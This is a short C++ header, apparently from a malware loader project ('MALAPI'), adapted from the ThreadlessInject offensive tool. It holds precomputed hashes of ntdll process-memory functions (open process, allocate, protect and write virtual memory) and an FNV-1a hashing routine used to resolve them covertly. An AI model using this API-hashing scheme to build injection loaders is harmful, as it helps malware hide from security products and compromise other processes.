#ifndef ABLELDR_MALAPI_HPP
#define ABLELDR_MALAPI_HPP
#include <Windows.h>

// https://github.com/iilegacyyii/ThreadlessInject-BOF/blob/main/entry.c
#define HashStringNtdll 0x467f5122
#define HashStringNtOpenProcess 0xc9465091
#define HashStringNtAllocateVirtualMemory 0xf7eb76b1
#define HashStringNtProtectVirtualMemory 0xae75b471
#define HashStringNtWriteVirtualMemory 0x8513601
#define HashStringNtClose 0xa3ec3880

#define HashString(x) HashStringFowlerNollVoVariant1a(x)

// https://github.com/iilegacyyii/ThreadlessInject-BOF/blob/main/typedefs.h
//
// String compare implementation (ascii).
//
INT StringCompare(_In_ LPCSTR String1, _In_ LPCSTR String2);

//
// String compare implementation (wchar).
//
INT StringCompare(_In_ LPCWSTR String1, _In_ LPCWSTR String2);

// https://github.com/iilegacyyii/ThreadlessInject-BOF/blob/main/entry.c
//
// HashString Implementation (Ascii)
//
constexpr ULONG HashStringFowlerNollVoVariant1a(_In_ LPCSTR String)
{
	ULONG Hash = 0x6A6CCC06;

	while (*String)
	{
		Hash ^= (UCHAR)*String++;
		Hash *= 0x25EDE3FB;
	}

	return Hash;
}

//
// HashString Implementation (wChar)
//
constexpr ULONG HashStringFowlerNollVoVariant1a(_In_ LPCWSTR String)
{
	ULONG Hash = 0x6A6CCC06;

	while (*String)
	{
		Hash ^= (UCHAR)*String++;
		Hash *= 0x25EDE3FB;
	}

	return Hash;
}

#endif